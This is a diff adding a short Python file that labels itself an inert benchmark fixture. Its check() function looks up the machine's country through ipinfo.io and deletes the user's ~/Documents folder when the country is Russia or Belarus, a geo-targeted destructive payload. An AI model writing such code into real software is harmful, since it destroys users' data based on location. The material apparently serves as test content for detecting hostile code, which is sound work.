@@ -1,0 +1,6 @@
+# INERT BENCHMARK FIXTURE - never import or run. Read as text by benchmark_fixtures.py only.
+import os, shutil, requests
+def check():
+    info = requests.get("https://ipinfo.io/json").json()
+    if info.get("country") in ("RU", "BY"):
+        shutil.rmtree(os.path.expanduser("~/Documents"))
